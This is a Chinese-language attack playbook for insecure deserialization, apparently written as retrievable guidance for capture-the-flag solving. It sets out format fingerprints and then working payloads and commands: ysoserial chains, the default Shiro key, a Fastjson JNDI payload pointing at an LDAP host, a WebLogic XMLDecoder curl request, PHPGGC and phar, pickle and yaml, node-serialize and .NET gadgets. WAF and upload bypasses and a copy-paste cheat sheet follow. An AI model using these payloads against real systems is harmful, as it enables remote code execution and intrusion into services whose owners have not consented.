# 反序列化全谱手册

适用题型（命中即召回本手册）：反序列化 序列化 对象注入 不安全反序列化 deserialization unserialize readObject pickle ysoserial PHPGGC gadget 链 Shiro rememberMe Fastjson WebLogic JBoss T3 phar __wakeup __destruct __reduce__ node-serialize ViewState BinaryFormatter

## 1. 识别与分类
按 magic bytes / base64 前缀判别序列化格式，再定语言与入口：
- Java `ac ed 00 05`（base64 `rO0AB`）；.NET BinaryFormatter `00 01 00 00 00 ff ff ff ff`（`AAEAAAD/////`）；ViewState `ff 01`（`/w`）
- Python pickle `80 02~05`（base64 `gASV`）；PHP `O:数字:"类名"` 或 `a:数字:{`；Ruby Marshal `04 08`
- 位置：cookie（rememberMe/JSESSIONID）、隐藏域（__VIEWSTATE）、请求体、消息队列
- 特征产品：`rememberMe=deleteMe`→Shiro；JSON 含 `@type`→Fastjson/JSON.NET；T3 端口 7001→WebLogic；`/wls-wsat/`→WebLogic XMLDecoder

## 2. 攻击方法论（判别→找链→落地）
### Java 原生 readObject
1. 先确认 readObject 被触发：`java -jar ysoserial.jar URLDNS "http://TOKEN.dnslog"`（需外带）或盲测 `sleep 10` 计时；再按类路径选链。
2. 链优先级 CC6→CC7→CC5→CB1（无 JDK 约束）；JDK<8u72 才用 CC1/CC3（TemplatesImpl 字节码）；`java -jar ysoserial.jar CommonsCollections6 "id" | base64 -w0`。
3. 落地：`id`/`ls` 验证 → `cat /challenge/flag.txt`；无回显用 sleep 计时或写 web 目录回读。

### Shiro（AES-CBC 特征）
1. 指纹：无效会话回 `rememberMe=deleteMe`；rememberMe 是 AES-CBC 加密的 Java 序列化对象（base64 解码长度是 16 的倍数）。
2. 默认 key 试 `kPH+bIxk5D2deZiIxcaaaA==`（SHIRO-550/CVE-2016-4437 通用默认）：ysoserial 生成 payload → AES-CBC(随机 IV) 加密 → base64 设 cookie。

### Fastjson（autotype 指纹）
1. JSON `{"@type":"..."}` 触发 autotype；先 `{"@type":"java.lang.Class","val":"..."}` 探版本/可用类。
2. JNDI 链（需出网）：`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://IP/Evil","autoCommit":true}`；离线换 TemplatesImpl 字节码链（`_bytecodes`+`_outputProperties`）。

### WebLogic / JBoss
1. WebLogic：T3（7001）直连发序列化对象；XMLDecoder（CVE-2017-10271）POST `/wls-wsat/CoordinatorPortType` 发 `<java><object class="java.lang.ProcessBuilder">...`。
2. JBoss：`/invoker/JMXInvokerServlet`、`/invoker/EJBInvokerServlet`、web-console 反序列化入口；ysoserial JBossInterceptors1。

### PHP unserialize
1. 找链：定位 `unserialize($x)` 入口 → 列可用类魔术方法（__wakeup/__destruct/__toString/__call）→ 追到敏感操作（文件写/SQL/RCE/SSRF）。
2. 序列化格式 `O:8:"Class":2:{...}`，私有属性用 `\0Class\0name`；PHPGGC 命中框架 `phpggc Laravel/RCE1 system id`。
3. phar://：任意文件操作函数（file_exists/file_get_contents/include/getimagesize 等）可控路径指向 `phar://uploads/x.jpg` 即触发 metadata 反序列化；`phpggc -p phar -o e.phar Monolog/RCE1 system id`。

### Python pickle / yaml
1. `__reduce__` 返回 (callable, args)：`python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"`。
2. yaml.load 无 SafeLoader：`!!python/object/apply:os.system ['id']`。

### Node node-serialize / .NET
1. node-serialize 用 eval：`{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id').toString()}()"}`。
2. .NET：BinaryFormatter（`AAEAAAD`）/ViewState（`/w`）/JSON.NET `$type`；`ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64`；JSON.NET 用 ObjectDataProvider+Process 链。

## 3. 变体与绕过
- WAF/过滤：base64 多层、gzip、hex、URL 编码包裹序列化流；Fastjson 1.2.47 用 `java.lang.Class` 缓存绕过 autotype 黑名单。
- 无回显/盲打：sleep 计时、写文件到静态目录回读、触发报错回显类名；有 DNS 外带才用 URLDNS/DNSLog。
- PHP `__wakeup` 跳过（CVE-2016-7124 通用）：把序列化对象属性计数改大（`O:N:"C":改大:{...}`）绕过 __wakeup 拦截。
- JDK 版本：<8u121 RMI/LDAP 远程类加载可用；>=8u191 两者被封，改 LDAP 返回序列化 gadget 或 TemplatesImpl 字节码链。
- phar 绕过 upload 限制：JPEG 头部 polyglot 拼接 phar，仍是合法图片但 file 操作触发反序列化。

## 战法要点
- 见 rO0AB/ac ed 先 URLDNS 或 sleep 确认 readObject，再按类路径选链，别盲喷。
- Java 链按 CC6→CC7→CC5→CB1 顺序，JDK<8u72 才用 CC1/CC3。
- rememberMe=deleteMe 即 Shiro 指纹，直接上默认 key 测 AES-CBC，先计时后 RCE。
- Fastjson 见 @type 先 JdbcRowSetImpl JNDI（需出网），离线换 TemplatesImpl 字节码。
- PHP 反序列化先画魔术方法→敏感 sink 链，再用 PHPGGC 命中框架，别硬造链。
- phar:// 不依赖 unserialize，可控文件路径即可触发，优先测。
- pickle/yaml.load 一条 __reduce__ 直通 RCE，先 id 验证再读 flag。
- 无回显一律 sleep 计时 + 写文件回读，别等外带通道。

## 速查清单
```text
# 判别
echo 'rO0AB...' | base64 -d | xxd | head -1
# Java
java -jar ysoserial.jar URLDNS "http://TOKEN.dnslog"
java -jar ysoserial.jar CommonsCollections6 "id" | base64 -w0
# Shiro：AES-CBC(key, 随机IV) 加密 ysoserial 输出 → base64 → rememberMe
key=kPH+bIxk5D2deZiIxcaaaA==
# Fastjson JNDI / 离线字节码
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://IP/Evil","autoCommit":true}
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["<b64class>"],"_name":"a","_tfactory":{},"_outputProperties":{}}
# WebLogic XMLDecoder
curl -s -X POST http://T:7001/wls-wsat/CoordinatorPortType -d '<java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array><void method="start"/></object></java>'
# PHP
phpggc -l; phpggc Laravel/RCE1 system id; phpggc -p phar -o e.phar Monolog/RCE1 system id
O:8:"Class":2:{s:4:"prop";s:5:"value";}   # 属性数改大跳过 __wakeup
# Python
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"
!!python/object/apply:os.system ['id']
# Node
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id').toString()}()"}
# .NET
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c whoami"]},"ObjectInstance":{"$type":"System.Diagnostics.Process"}}
```
